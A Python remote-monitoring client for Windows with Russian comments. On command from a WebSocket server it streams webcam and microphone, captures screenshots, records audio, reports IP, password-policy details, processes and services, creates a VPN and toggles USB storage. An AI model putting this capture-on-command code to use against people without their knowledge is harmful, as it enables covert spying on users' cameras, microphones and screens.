import cv2
import requests
import time
import logging
import threading
from mss import mss  # Для захвата скриншотов
from mss.tools import to_png  # Для конвертации в PNG
import websocket  # pip install websocket-client
import psutil       # Для получения системных метрик
import platform     # Для информации о процессоре и ОС
import json         # Для сериализации данных в JSON
import subprocess
import getpass
import os
import ctypes
import winreg

import pyaudio
import wave
import io
import socket

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("client.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Настройки
BASE_URL = "http://127.0.0.1:4000"
SERVER_URL = "http://127.0.0.1:4000/upload"  # Адрес сервера для загрузки данных
FRAME_RATE = 10           # Количество кадров в секунду (для видео)
SCREENSHOT_INTERVAL = 5   # Интервал между скриншотами (в секундах)
WS_URL = "ws://127.0.0.1:4000/ws"  # URL WebSocket-сервера
RECORD_DURATION = 5 # Длительность записи аудио (в секундах)

# Глобальный флаг трансляции – по умолчанию выключен
streaming_active = False
mic_streaming_active = False

# Глобальные переменные для защиты WebSocket-соединения
ws_lock = threading.Lock()
ws_active = False

def send_ip_via_ws(ws):
    """
    Получает публичный IP через ipify и отправляет его на сервер через WebSocket.
    Формат сообщения: "ip:<адрес>"
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = response.json().get("ip")
        logger.info(f"Получен публичный IP: {ip}")
        ws.send("ip:" + ip)
    except Exception as e:
        logger.error(f"Ошибка получения или отправки публичного IP: {e}")

def get_init_info() -> dict:
    """Получить IP (через ipify) и метрики, вернуть их одним словарём."""
    # Получаем IP
    ip = ""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = response.json().get("ip")
        logger.info(f"Получен публичный IP: {ip}")
    except Exception as e:
        logger.error(f"Ошибка получения публичного IP: {e}")

    # Собираем метрики
    metrics = {}
    try:
        disk_usage = psutil.disk_usage("C:\\")
        metrics["disk_total"] = disk_usage.total
        metrics["disk_free"] = disk_usage.free

        mem = psutil.virtual_memory()
        metrics["memory_total"] = mem.total
        metrics["memory_available"] = mem.available

        metrics["processor"] = platform.processor()
        metrics["os"] = f"{platform.system()} {platform.release()}"
        metrics["has_password"] = current_user_has_password()
        metrics["minimum_password_lenght"] = get_min_password_length()

        hostname = socket.gethostname()
        metrics["pc_name"] = hostname
    except Exception as e:
        logger.error(f"Ошибка сбора метрик: {e}")
        metrics["error"] = str(e)

    return {
        "ip": ip,
        "metrics": metrics,
        "apps_services": {
            "processes": get_running_processes(),
            "services": get_running_services()
        }
    }

def collect_and_send_metrics(ws):
    """
    Собирает метрики системы (дисковое пространство, оперативную память, процессор, ОС)
    и отправляет их на сервер в формате JSON.
    """
    metrics = {}
    try:
        # Получаем данные по дисковому пространству для системного диска (обычно C:\)
        disk_usage = psutil.disk_usage("C:\\")
        metrics["disk_total"] = disk_usage.total
        metrics["disk_free"] = disk_usage.free

        # Получаем данные по оперативной памяти
        mem = psutil.virtual_memory()
        metrics["memory_total"] = mem.total
        metrics["memory_available"] = mem.available

        # Тип процессора
        metrics["processor"] = platform.processor()

        # Операционная система
        metrics["os"] = f"{platform.system()} {platform.release()}"
        metrics["has_password"] = current_user_has_password()
        metrics["minimum_password_lenght"] = get_min_password_length()
    except Exception as e:
        logger.error(f"Ошибка сбора метрик: {e}")
        metrics["error"] = str(e)

    try:
        # Отправляем метрики на сервер
        ws.send(json.dumps({"command": "metrics", "data": metrics}))
        logger.info("Метрики отправлены на сервер")
    except Exception as e:
        logger.error(f"Ошибка отправки метрик: {e}")

def capture_and_send_video():
    """
    Захват видео и скриншотов.
    Камера открывается только когда streaming_active True.
    При выключении трансляции камера закрывается, чтобы не нагружать систему.
    """
    camera = None

    while True:
        if streaming_active:
            if camera is None:
                camera = cv2.VideoCapture(0)
                if not camera.isOpened():
                    logger.error("Камера не найдена. Попытка повторного открытия через 5 секунд.")
                    camera = None
                    time.sleep(5)
                    continue
                logger.info("Камера успешно запущена.")

            ret, frame = camera.read()
            if not ret:
                logger.error("Ошибка захвата кадра")
                time.sleep(1)
                continue

            _, buffer = cv2.imencode(".jpg", frame)
            frame_data = buffer.tobytes()

            try:
                logger.info("Отправка кадра на сервер...")
                response = requests.post(
                    f"{SERVER_URL}/",
                    data=frame_data,
                    headers={"Content-Type": "image/jpeg"}
                )
                if response.status_code == 200:
                    logger.info("Кадр успешно отправлен.")
                else:
                    logger.error(f"Ошибка отправки кадра: {response.status_code} - {response.text}")
            except Exception as e:
                logger.error(f"Ошибка отправки видео: {e}")

            time.sleep(1 / FRAME_RATE)
        else:
            if camera is not None:
                camera.release()
                camera = None
                logger.info("Камера освобождена (трансляция остановлена).")
            time.sleep(1)

def takeScreenshot():
    sct = mss()

    try:
        screenshot = sct.grab(sct.monitors[1])
        screenshot_data = to_png(screenshot.rgb, screenshot.size)
        logger.info("Отправка скриншота на сервер...")
        response = requests.post(
            f"{SERVER_URL}/screenshot",
            data=screenshot_data,
            headers={"Content-Type": "image/png"}
        )
        if response.status_code == 200:
            logger.info("Скриншот успешно отправлен.")
        else:
            logger.error(f"Ошибка отправки скриншота: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error(f"Ошибка захвата или отправки скриншота: {e}")

def capture_and_send_audio():
    """
    Захват аудио с микрофона и отправка данных на сервер.
    Микрофон открывается только когда mic_streaming_active True.
    При остановке трансляции аудио поток закрывается.
    """
    global mic_streaming_active
    stream = None
    p = pyaudio.PyAudio()

    while True:
        if mic_streaming_active:
            if stream is None:
                try:
                    stream = p.open(format=pyaudio.paInt16,
                                    channels=1,
                                    rate=44100,
                                    input=True,
                                    frames_per_buffer=1024)
                    logger.info("Микрофон успешно запущен.")
                except Exception as e:
                    logger.error("Ошибка открытия микрофона: " + str(e))
                    stream = None
                    time.sleep(5)
                    continue

            try:
                audio_data = stream.read(1024, exception_on_overflow=False)
                logger.info("Отправка аудио кадра на сервер...")
                response = requests.post(
                    f"{SERVER_URL}/audio",
                    data=audio_data,
                    headers={"Content-Type": "application/octet-stream"}
                )
                if response.status_code == 200:
                    logger.info("Аудио кадр успешно отправлен.")
                else:
                    logger.error(f"Ошибка отправки аудио кадра: {response.status_code} - {response.text}")
            except Exception as e:
                logger.error(f"Ошибка захвата или отправки аудио: {e}")

            time.sleep(0.1)  # Короткая задержка между отправками
        else:
            if stream is not None:
                stream.stop_stream()
                stream.close()
                stream = None
                logger.info("Микрофон освобождён (трансляция остановлена).")
            time.sleep(1)

def record_audio_snippet():
    """
    Записывает аудио с микрофона в течение RECORD_DURATION секунд,
    конвертирует запись в формат WAV и отправляет на сервер.
    """
    p = pyaudio.PyAudio()
    stream = None
    frames = []
    try:
        stream = p.open(format=pyaudio.paInt16,
                        channels=1,
                        rate=44100,
                        input=True,
                        frames_per_buffer=1024)
        logger.info(f"Начата запись аудио на {RECORD_DURATION} секунд...")
        for i in range(0, int(44100 / 1024 * RECORD_DURATION)):
            data = stream.read(1024, exception_on_overflow=False)
            frames.append(data)
        logger.info("Запись аудио завершена.")
    except Exception as e:
        logger.error("Ошибка записи аудио: " + str(e))
    finally:
        if stream is not None:
            stream.stop_stream()
            stream.close()
        p.terminate()

    # Сохранение аудио в WAV формат в память
    try:
        buffer = io.BytesIO()
        wf = wave.open(buffer, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()
        audio_bytes = buffer.getvalue()

        logger.info("Отправка записанного аудио на сервер...")
        response = requests.post(
            f"{SERVER_URL}/recorded_audio",
            data=audio_bytes,
            headers={"Content-Type": "audio/wav"}
        )
        if response.status_code == 200:
            logger.info("Записанное аудио успешно отправлено.")
        else:
            logger.error(f"Ошибка отправки записанного аудио: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error("Ошибка обработки или отправки записанного аудио: " + str(e))

def control_ws():
    global ws_active
    def on_message(ws, message):
        global streaming_active, mic_streaming_active
        logger.info(f"Получена команда: {message}")
        cmd = message.lower()
        if cmd == "stop":
            streaming_active = False
            logger.info("Видео трансляция остановлена командой сервера.")
        elif cmd == "start":
            streaming_active = True
            logger.info("Видео трансляция запущена командой сервера.")
        elif cmd == "send_ip":
            logger.info("Отправка данных по IP по команде сервера.")
            send_ip_via_ws(ws)
        elif cmd == "screenshot":
            takeScreenshot()
        elif cmd == "metrics":
            collect_and_send_metrics(ws)
        elif cmd == "mic_start":
            mic_streaming_active = True
            logger.info("Трансляция микрофона запущена командой сервера.")
        elif cmd == "mic_stop":
            mic_streaming_active = False
            logger.info("Трансляция микрофона остановлена командой сервера.")
        elif cmd == "record_audio":
            logger.info("Запись аудио по команде сервера.")
            threading.Thread(target=record_audio_snippet, daemon=True).start()
        elif cmd == "vpn_create":
            logger.info("Создание VPN подключения по команде сервера.")
            threading.Thread(target=create_vpn_connection, daemon=True).start()
        # elif cmd == "list_apps_services":
        #     logger.info("Запрос на получение списка приложений и служб по команде сервера.")
        #     threading.Thread(target=send_apps_and_services, args=(ws,), daemon=True).start()
        elif cmd == "usb_on":
            logger.info(f"проверка запущен ли клиент от администратора {is_admin()}") 
            logger.info("Запрос на включение USB портов.")
            enable_usb_ports()
        elif cmd =="usb_off":
            logger.info(f"проверка запущен ли клиент от администратора {is_admin()}") 
            logger.info("Запрос на отключение USB портов.")
            disable_usb_ports()

    def on_error(ws, error):
        logger.error(f"WebSocket ошибка: {error}")

    def on_close(ws, close_status_code, close_msg):
        global ws_active
        with ws_lock:
            ws_active = False
        logger.info("WebSocket соединение закрыто")

    def on_open(ws):
        global ws_active
        with ws_lock:
            ws_active = True
        logger.info("WebSocket соединение установлено")
        ws.send("Client connected")
        init_data = get_init_info()
        payload = {
            "command": "init_info",
            "data": init_data
        }
        ws.send(json.dumps(payload))
        logger.info("Отправлен init_info (ip + metrics).")

    while True:
        with ws_lock:
            active = ws_active
        if not active:
            try:
                ws = websocket.WebSocketApp(WS_URL,
                                            on_open=on_open,
                                            on_message=on_message,
                                            on_error=on_error,
                                            on_close=on_close)
                ws.run_forever()
            except Exception as e:
                logger.error(f"Ошибка WebSocket подключения: {e}")
        time.sleep(5)  # Попытка переподключения через 5 секунд, если соединение не активно

def current_user_has_password() -> bool:
    username = getpass.getuser()

    ps_command = f'Get-LocalUser -Name "{username}" | Select-Object -ExpandProperty PasswordRequired'
    command = ['powershell', '-Command', ps_command]

    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=10
        ).strip().lower()
        return output == 'true'

    except Exception:
        return False

def get_min_password_length() -> int:
    try:
        output = subprocess.check_output(
            ['net', 'accounts'],
            stderr=subprocess.STDOUT,
            text=True,
            timeout=10
        )
        for line in output.splitlines():
            if "Minimum password length" in line:
                return int(line.split()[-1])
        return -1
    except Exception:
        return -1
    
def create_vpn_connection():
    # Пример для Windows с использованием PowerShell
    vpn_name = "MyVPN"
    server_address = "vpn.example.com"
    # Команда создаст VPN-подключение, но не будет его активировать
    command = [
        "powershell",
        "-Command",
        f"Add-VpnConnection -Name \"{vpn_name}\" -ServerAddress \"{server_address}\" -TunnelType L2tp -Force -PassThru"
    ]
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, text=True)
        logger.info("VPN connection created successfully: " + output)
    except Exception as e:
        logger.error("Error creating VPN connection: " + str(e))

def get_running_processes():
    processes = []
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        try:
            processes.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return processes

def get_running_services():
    services = []
    try:
        for svc in psutil.win_service_iter():
            try:
                info = svc.as_dict()
                services.append({
                    "name": info.get("name"),
                    "display_name": info.get("display_name"),
                    "status": info.get("status")
                })
            except psutil.NoSuchProcess:
                continue
    except Exception as e:
        services.append({"error": str(e)})
    return services

def send_apps_and_services(ws):
    data = {
        "command": "apps_services",
        "data": {
            "processes": get_running_processes(),
            "services": get_running_services()
        }
    }
    ws.send(json.dumps(data))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def enable_usb_ports():
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\USBSTOR",
            0,
            winreg.KEY_SET_VALUE
        )
        # Set the "Start" value to 3 (enabled)
        winreg.SetValueEx(reg_key, "Start", 0, winreg.REG_DWORD, 3)
        winreg.CloseKey(reg_key)
        print("USB ports have been enabled.")
    except Exception as e:
        print(f"Failed to enable USB ports: {e}")

def disable_usb_ports():
    try:
        reg_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SYSTEM\CurrentControlSet\Services\USBSTOR",
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(reg_key, "Start", 0, winreg.REG_DWORD, 4)
        winreg.CloseKey(reg_key)
        print("USB ports have been disabled.")
    except Exception as e:
        print(f"Failed to disable USB ports: {e}")


if __name__ == "__main__":
    logger.info("Клиент запустился")
    # Проверка доступности сервера
    try:
        response = requests.get(f"{BASE_URL + '/api/time'}", timeout=5)
        if response.status_code == 200:
            logger.info(f"Сервер доступен. Серверное время: {response.text}")
        else:
            logger.error(f"Ошибка подключения к серверу: {response.status_code}")
            exit(1)
    except Exception as e:
        logger.error(f"Ошибка подключения к серверу: {e}")
        exit(1)

    # Запуск потока WebSocket для управления трансляцией (только один раз!)
    ws_thread = threading.Thread(target=control_ws, daemon=True)
    ws_thread.start()

    # Запуск потока для трансляции видео
    video_thread = threading.Thread(target=capture_and_send_video, daemon=True)
    video_thread.start()

    ws_thread.join()
    video_thread.join()

